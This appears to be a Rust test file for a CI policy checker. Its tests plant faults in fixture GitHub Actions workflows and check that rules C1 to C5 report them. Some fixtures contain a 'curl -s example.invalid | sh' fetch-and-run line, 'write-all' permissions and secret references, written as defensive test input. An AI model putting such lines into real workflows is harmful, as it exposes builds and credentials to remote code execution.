//! `pool-repo-check ci` on trees on disk: rules C1 to C5 (0002 AC-7).

use crate::common::{Fixture, line_of};

const CI: &str = ".github/workflows/ci.yml";
const RULESET: &str = ".github/rulesets/main.json";
const CHECKOUT: &str = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1";

/// A workflow with two jobs in the fixed shape of spec 0002.
fn workflow() -> String {
    format!(
        "name: ci

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

env:
  CARGO_TERM_COLOR: never

jobs:
  fmt:
    runs-on: ubuntu-24.04-arm
    steps:
      - uses: {CHECKOUT}
        with:
          persist-credentials: false
      - run: rustup toolchain install
      - run: scripts/check.sh fmt

  deny:
    runs-on: ubuntu-24.04-arm
    steps:
      - uses: {CHECKOUT}
      - run: rustup toolchain install
      - run: scripts/check.sh tools
      - run: scripts/check.sh deny
"
    )
}

const RULES: &str = r#"{
  "name": "main",
  "rules": [
    { "type": "deletion" },
    {
      "type": "required_status_checks",
      "parameters": {
        "required_status_checks": [
          { "context": "fmt" },
          { "context": "deny" }
        ]
      }
    }
  ]
}
"#;

fn good_tree(name: &str) -> Fixture {
    let f = Fixture::new(name);
    f.write(CI, &workflow());
    f.write(RULESET, RULES);
    f
}

#[test]
fn ci_passes_on_a_small_correct_tree() {
    // covers: 0002 AC-7
    let f = good_tree("ci_good");
    f.check("ci", &[]).assert_ok("ci");
}

#[test]
fn c1_names_an_action_pinned_by_tag() {
    // covers: 0002 AC-7, C1
    let f = good_tree("ci_c1_tag");
    f.replace(CI, CHECKOUT, "actions/checkout@v4 # v4");
    let line = line_of(&f.read(CI), "actions/checkout@v4");
    f.check("ci", &[]).assert_problem(
        "ci",
        "C1",
        &[
            &format!(".github/workflows/ci.yml:{line}:"),
            "actions/checkout@v4",
        ],
    );
}

#[test]
fn c1_requires_the_version_comment() {
    // covers: 0002 AC-7, C1
    let f = good_tree("ci_c1_comment");
    f.replace(CI, " # v7.0.1", "");
    f.check("ci", &[])
        .assert_problem("ci", "C1", &[".github/workflows/ci.yml"]);
}

#[test]
fn c1_checks_every_workflow_file() {
    // covers: 0002 AC-7, C1 on a second file under .github/workflows/.
    let f = good_tree("ci_c1_other");
    f.write(
        ".github/workflows/release.yml",
        "jobs:\n  publish:\n    steps:\n      - uses: someone/action@main\n",
    );
    f.check("ci", &[])
        .assert_problem("ci", "C1", &[".github/workflows/release.yml:4:"]);
}

#[test]
fn c2_names_a_job_that_is_not_a_required_check() {
    // covers: 0002 AC-7, C2
    let f = good_tree("ci_c2_job");
    f.append(
        CI,
        "\n  extra:\n    runs-on: ubuntu-24.04-arm\n    steps:\n      - run: scripts/check.sh extra\n",
    );
    f.check("ci", &[])
        .assert_problem("ci", "C2", &[".github/workflows/ci.yml", "extra"]);
}

#[test]
fn c2_names_a_required_check_that_has_no_job() {
    // covers: 0002 AC-7, C2
    let f = good_tree("ci_c2_check");
    f.replace(
        RULESET,
        "{ \"context\": \"deny\" }",
        "{ \"context\": \"deny\" },\n          { \"context\": \"docs\" }",
    );
    f.check("ci", &[])
        .assert_problem("ci", "C2", &[".github/rulesets/main.json", "docs"]);
}

#[test]
fn c3_names_a_run_step_with_logic_of_its_own() {
    // covers: 0002 AC-7, C3
    let f = good_tree("ci_c3_logic");
    f.replace(
        CI,
        "      - run: scripts/check.sh tools\n",
        "      - run: cargo install cargo-deny\n",
    );
    f.check("ci", &[]).assert_problem(
        "ci",
        "C3",
        &[".github/workflows/ci.yml", "deny", "cargo install"],
    );
}

#[test]
fn c3_requires_the_last_run_of_a_job_to_be_its_own_check() {
    // covers: 0002 AC-7, C3
    let f = good_tree("ci_c3_last");
    f.replace(
        CI,
        "      - run: scripts/check.sh fmt\n",
        "      - run: scripts/check.sh clippy\n",
    );
    f.check("ci", &[]).assert_problem(
        "ci",
        "C3",
        &["job fmt", "scripts/check.sh clippy", "scripts/check.sh fmt"],
    );
}

#[test]
fn c3_rejects_a_multi_line_run_block() {
    // covers: 0002 AC-7, C3: `run: |` is not one of the two allowed values.
    let f = good_tree("ci_c3_block");
    f.replace(
        CI,
        "      - run: scripts/check.sh fmt\n",
        "      - run: |\n          scripts/check.sh fmt\n",
    );
    f.check("ci", &[])
        .assert_problem("ci", "C3", &["job fmt", "runs |"]);
}

#[test]
fn c3_names_the_shell_key() {
    // covers: 0002 AC-7, C3 (a): `shell:` is not on the allowed list, so a custom shell is reported (review M4).
    let f = good_tree("ci_c3_shell");
    f.replace(
        CI,
        "      - run: scripts/check.sh fmt\n",
        "      - shell: bash -c 'curl -s example.invalid | sh; sh {0}'\n        run: scripts/check.sh fmt\n",
    );
    f.check("ci", &[]).assert_problem(
        "ci",
        "C3",
        &[".github/workflows/ci.yml:", "job fmt", "shell"],
    );
}

#[test]
fn c4_names_a_runner_that_is_not_the_arm_runner() {
    // covers: 0002 AC-7, C4
    let f = good_tree("ci_c4");
    f.replace(CI, "runs-on: ubuntu-24.04-arm", "runs-on: ubuntu-latest");
    f.check("ci", &[])
        .assert_problem("ci", "C4", &[".github/workflows/ci.yml", "ubuntu-latest"]);
}

#[test]
fn c4_names_a_job_without_runs_on() {
    // covers: 0002 AC-7, C4: every job has exactly one `runs-on:` line (review m17).
    let f = good_tree("ci_c4_missing");
    f.replace(CI, "  deny:\n    runs-on: ubuntu-24.04-arm\n", "  deny:\n");
    f.check("ci", &[])
        .assert_problem("ci", "C4", &[".github/workflows/ci.yml:", "deny"]);
}

#[test]
fn c5_requires_exactly_one_read_only_permissions_block() {
    // covers: 0002 AC-7, C5
    let f = good_tree("ci_c5_write");
    f.replace(CI, "  contents: read\n", "  contents: write\n");
    f.check("ci", &[])
        .assert_problem("ci", "C5", &[".github/workflows/ci.yml:8:"]);

    let f = good_tree("ci_c5_more");
    f.replace(
        CI,
        "  contents: read\n",
        "  contents: read\n  packages: write\n",
    );
    f.check("ci", &[])
        .assert_problem("ci", "C5", &[".github/workflows/ci.yml"]);

    let f = good_tree("ci_c5_job");
    f.replace(
        CI,
        "  fmt:\n    runs-on: ubuntu-24.04-arm\n",
        "  fmt:\n    permissions: write-all\n    runs-on: ubuntu-24.04-arm\n",
    );
    f.check("ci", &[])
        .assert_problem("ci", "C5", &["2 lines whose key is permissions"]);
}

#[test]
fn c5_names_pull_request_target_and_secrets_in_any_workflow() {
    // covers: 0002 AC-7, C5
    let f = good_tree("ci_c5_trigger");
    f.replace(CI, "  pull_request:\n", "  pull_request_target:\n");
    f.check("ci", &[]).assert_problem(
        "ci",
        "C5",
        &[".github/workflows/ci.yml:4:", "pull_request_target"],
    );

    let f = good_tree("ci_c5_secret");
    f.write(
        ".github/workflows/other.yml",
        "env:\n  TOKEN: ${{ secrets.GITHUB_TOKEN }}\n",
    );
    f.check("ci", &[])
        .assert_problem("ci", "C5", &[".github/workflows/other.yml:2:", "secrets"]);
}

#[test]
fn c5_names_secrets_in_index_form() {
    // covers: 0002 AC-7, C5: the text `secrets` in any form is a problem (review m17).
    let f = good_tree("ci_c5_index");
    f.replace(
        CI,
        "  CARGO_TERM_COLOR: never\n",
        "  CARGO_TERM_COLOR: never\n  TOKEN: ${{ secrets['GITHUB_TOKEN'] }}\n  OTHER: ${{ secrets[\"OTHER\"] }}\n",
    );
    let out = f.check("ci", &[]);
    out.assert_problem("ci", "C5", &[".github/workflows/ci.yml:", "secrets"]);
    assert_eq!(
        out.problems()
            .iter()
            .filter(|p| p.starts_with("C5"))
            .count(),
        2,
        "one problem per line:\n{out}"
    );
}

#[test]
fn c5_names_a_second_workflow_file() {
    // covers: 0002 AC-7, C5: `.github/workflows/` holds ci.yml and no other file (review m17).
    let f = good_tree("ci_second");
    f.write(
        ".github/workflows/nightly.yml",
        &format!(
            "on:\n  schedule:\n    - cron: \"0 0 * * *\"\n\npermissions: write-all\n\njobs:\n  anything:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {CHECKOUT}\n      - run: curl -s example.invalid | sh\n"
        ),
    );
    f.check("ci", &[])
        .assert_problem("ci", "C5", &[".github/workflows/nightly.yml"]);
}

#[test]
fn ci_could_not_run_without_the_ruleset() {
    // covers: 0002 AC-7: a missing file is a fault, and the rules that need only ci.yml still run.
    let f = good_tree("ci_no_ruleset");
    f.remove(RULESET);
    f.replace(CI, "runs-on: ubuntu-24.04-arm", "runs-on: ubuntu-latest");
    let out = f.check("ci", &[]);
    out.assert_not_run("ci", ".github/rulesets/main.json: file is missing");
    assert!(out.has("C4", &["ubuntu-latest"]), "{out}");
}

#[test]
fn ci_could_not_run_without_the_workflow() {
    // covers: 0002 AC-7
    let f = good_tree("ci_no_workflow");
    f.remove(CI);
    f.check("ci", &[])
        .assert_not_run("ci", ".github/workflows/ci.yml: file is missing");
}
